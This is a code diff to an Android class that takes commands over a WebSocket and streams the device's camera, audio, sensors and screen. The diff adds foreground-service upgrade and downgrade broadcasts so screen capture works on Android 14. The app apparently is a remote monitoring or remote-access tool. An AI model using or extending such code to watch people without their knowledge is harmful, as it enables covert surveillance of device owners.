@@ -12,7 +12,6 @@ import android.os.Build
 import android.os.VibrationEffect
 import android.os.Vibrator
 import android.os.VibratorManager
-import android.util.Log
 import com.systemlinker.base.ErrorLogger
 import kotlinx.coroutines.*
 import okhttp3.*
@@ -20,6 +19,70 @@ import okio.ByteString
 import org.json.JSONObject
 import java.util.concurrent.TimeUnit
 
+/**
+ * =================================================================================================
+ * IMPORTANT: REQUIRED CHANGES IN OTHER FILES FOR THIS TO WORK
+ * =================================================================================================
+ *
+ * 1. In `Constants.kt` -> `Intents`, add these new actions:
+ *
+ *    const val ACTION_UPGRADE_FGS_FOR_MEDIA_PROJECTION = "com.systemlinker.UPGRADE_FGS_MP"
+ *    const val ACTION_DOWNGRADE_FGS_AFTER_MEDIA_PROJECTION = "com.systemlinker.DOWNGRADE_FGS_MP"
+ *
+ *
+ * 2. In `SystemLinkerService.kt`, you MUST register a new BroadcastReceiver to handle these actions:
+ *
+ *    // --- Add this receiver inside your SystemLinkerService class ---
+ *    private val fgsUpgradeReceiver = object : BroadcastReceiver() {
+ *        override fun onReceive(context: Context?, intent: Intent?) {
+ *            when (intent?.action) {
+ *                Constants.Intents.ACTION_UPGRADE_FGS_FOR_MEDIA_PROJECTION -> {
+ *                     // UPGRADE: Add mediaProjection type and restart foreground service
+ *                     val serviceTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
+ *                                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
+ *                                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
+ *                                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION // ADDED
+ *
+ *                     startForeground(1001, createNotification(isStreaming = true), serviceTypes)
+ *                }
+ *                Constants.Intents.ACTION_DOWNGRADE_FGS_AFTER_MEDIA_PROJECTION -> {
+ *                     // DOWNGRADE: Remove mediaProjection type
+ *                     val serviceTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
+ *                                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
+ *                                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION // REMOVED
+ *
+ *                     startForeground(1001, createNotification(isStreaming = false), serviceTypes)
+ *                }
+ *            }
+ *        }
+ *    }
+ *
+ *    // --- In `onCreate()` of SystemLinkerService, register the receiver ---
+ *    val filter = IntentFilter().apply {
+ *        addAction(Constants.Intents.ACTION_UPGRADE_FGS_FOR_MEDIA_PROJECTION)
+ *        addAction(Constants.Intents.ACTION_DOWNGRADE_FGS_AFTER_MEDIA_PROJECTION)
+ *    }
+ *    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+ *        registerReceiver(fgsUpgradeReceiver, filter, RECEIVER_NOT_EXPORTED)
+ *    } else {
+ *        registerReceiver(fgsUpgradeReceiver, filter)
+ *    }
+ *
+ *    // --- In `onDestroy()` of SystemLinkerService, unregister it ---
+ *    unregisterReceiver(fgsUpgradeReceiver)
+ *
+ *
+ *    // --- Optional: Modify createNotification() to show streaming status ---
+ *    private fun createNotification(isStreaming: Boolean = false): Notification {
+ *         val text = if (isStreaming) "Live screen streaming active." else Constants.Service.NOTIFICATION_TEXT
+ *         return NotificationCompat.Builder(this, Constants.Service.NOTIFICATION_CHANNEL_ID)
+ *             .setContentTitle(Constants.Service.NOTIFICATION_TITLE)
+ *             .setContentText(text)
+ *             // ... rest of builder
+ *             .build()
+ *     }
+ * =================================================================================================
+ */
 class LiveSessionManager(private val context: Context) : WebSocketListener() {
 
     private var webSocket: WebSocket? = null
@@ -49,9 +112,24 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
                         @Suppress("DEPRECATION")
                         intent.getParcelableExtra("data")
                     }
-                    if (data != null) {
-                        screenStreamer.startStreaming(code, data)
-                        sendJson(JSONObject().put("status", "screen_cast_started"))
+
+                    if (data != null && context != null) {
+                        // ** CRASH FIX FOR ANDROID 14+ **
+                        // We must first command the service to "upgrade" its Foreground Service type
+                        // to include mediaProjection BEFORE we start streaming.
+                        scope.launch {
+                            // 1. Send the broadcast command to SystemLinkerService.
+                            val upgradeIntent = Intent("com.systemlinker.UPGRADE_FGS_MP")
+                            context.sendBroadcast(upgradeIntent)
+
+                            // 2. Give the service a moment to process the FGS upgrade.
+                            // Without this, startStreaming might be called before the OS acknowledges the change.
+                            delay(500)
+
+                            // 3. Now it is safe to start the screen stream.
+                            screenStreamer.startStreaming(code, data)
+                            sendJson(JSONObject().put("status", "screen_cast_started"))
+                        }
                     }
                 }
                 "com.systemlinker.SCREEN_CAST_CONSENT_DENIED" -> {
@@ -83,7 +161,13 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
         stopSensorStream()
         audioStreamer.stopAll()
         cameraStreamer.stopStreaming()
-        screenStreamer.stopStreaming()
+        
+        // Check if screen streamer is running and command a service downgrade if it is.
+        if (screenStreamer.isStreaming) {
+            screenStreamer.stopStreaming()
+            val downgradeIntent = Intent("com.systemlinker.DOWNGRADE_FGS_MP")
+            context.sendBroadcast(downgradeIntent)
+        }
         
         val intent = Intent("com.systemlinker.ACC_ACTION")
         intent.putExtra("action", "stream_screen_stop")
@@ -140,12 +224,16 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
                     intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                     context.startActivity(intent)
                 } else {
-                    screenStreamer.stopStreaming()
+                    // Stop streaming and tell the service to "downgrade" its FGS type
+                    if (screenStreamer.isStreaming) {
+                       screenStreamer.stopStreaming()
+                       val downgradeIntent = Intent("com.systemlinker.DOWNGRADE_FGS_MP")
+                       context.sendBroadcast(downgradeIntent)
+                    }
                     sendJson(JSONObject().put("status", "screen_cast_stopped"))
                 }
             }
             
-            // --- NEW: DYNAMIC RESOLUTION CONTROL ---
             "live_screen_res" -> {
                 val requestedRes = arg.toIntOrNull()
                 if (requestedRes != null) {
